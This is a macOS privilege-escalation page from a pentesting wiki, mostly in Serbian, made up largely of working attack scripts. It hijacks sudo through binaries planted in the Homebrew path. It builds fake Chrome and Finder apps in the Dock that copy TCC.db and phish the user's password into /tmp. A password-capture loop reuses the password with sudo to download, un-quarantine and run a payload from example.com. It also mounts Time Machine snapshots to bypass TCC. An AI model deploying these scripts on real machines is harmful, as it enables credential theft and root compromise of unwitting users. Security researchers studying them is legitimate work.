# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Ako ste došli ovde tražeći TCC privilege escalation, idite na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Imajte na umu da će **većina trikova vezanih za privilege escalation koji utiču na Linux/Unix** takođe uticati i na MacOS mašine. Dakle, pogledajte:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interakcija sa korisnikom

### Sudo Hijacking

Možete pronaći originalnu [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Međutim, macOS **održava** korisnikov **`PATH`** kada korisnik izvršava **`sudo`**. To znači da bi drugi način da se izvede ovaj napad bio da se **hijack other binaries** koje žrtva i dalje izvršava kada pokreće **sudo**:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Imajte na umu da korisnik koji koristi terminal vrlo verovatno ima **Homebrew installed**. Dakle, moguće je preuzeti kontrolu nad binarnim fajlovima u **`/opt/homebrew/bin`**.

### Dock Impersonation

Korišćenjem neke **social engineering** taktike možete, na primer, **impersonate Google Chrome** u Dock-u i zapravo izvršiti sopstveni skript:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Neki predlozi:

- Proverite u Dock-u da li postoji Chrome, i u tom slučaju **uklonite** tu stavku i **dodajte** **lažnu** **Chrome stavku na istoj poziciji** u Dock nizu.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Some suggestions:

- Ne možete da uklonite Finder iz Dock-a, pa ako planirate da ga dodate u Dock, možete postaviti lažnog Findera odmah pored pravog. Za ovo treba da **dodate unos lažnog Findera na početak Dock array-a**.
- Druga opcija je da ga ne stavljate u Dock i samo ga otvorite — "Finder asking to control Finder" ne zvuči previše čudno.
- Još jedna opcija da **escalate to root without asking** lozinku preko ružnog dijaloga jeste da naterate Finder da zaista zatraži lozinku da bi izvršio privilegovanu akciju:
- Naredite Finderu da kopira u **`/etc/pam.d`** novi **`sudo`** fajl (Dijalog koji traži lozinku će pokazati "Finder wants to copy sudo")
- Naredite Finderu da kopira novi **Authorization Plugin** (Možete kontrolisati ime fajla tako da dijalog koji traži lozinku pokaže "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Phishing putem upita za lozinku + ponovna upotreba sudo

Malware često zloupotrebljava interakciju korisnika da bi **uhvatio lozinku koja omogućava sudo** i ponovo je programski koristio. Uobičajen tok:

1. Identifikuj prijavljenog korisnika koristeći `whoami`.
2. **Petlja kroz zahteve za lozinku** dok `dscl . -authonly "$user" "$pw"` ne vrati uspeh.
3. Keširaj akreditive (npr. `/tmp/.pass`) i izvršavaj privilegovane akcije sa `sudo -S` (lozinka preko stdin).

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ukradena lozinka se potom može ponovo iskoristiti da **ukloni Gatekeeper karantin koristeći `xattr -c`**, kopira LaunchDaemons ili druge privilegovane datoteke, i pokrene dodatne faze bez interakcije.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Bilo koji korisnik** (čak i neprivilegovani) može kreirati i mount-ovati Time Machine snapshot i **pristupiti SVIM datotekama** tog snapshot-a.\
**Jedina privilegija** koja je potrebna je da aplikacija koja se koristi (npr. `Terminal`) ima **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), koju mora dodeliti admin.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Detaljnije objašnjenje može se naći u [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Osetljive informacije

Ovo može biti korisno za eskalaciju privilegija:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Reference

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-Infostealer/)

{{#include ../../banners/hacktricks-training.md}}
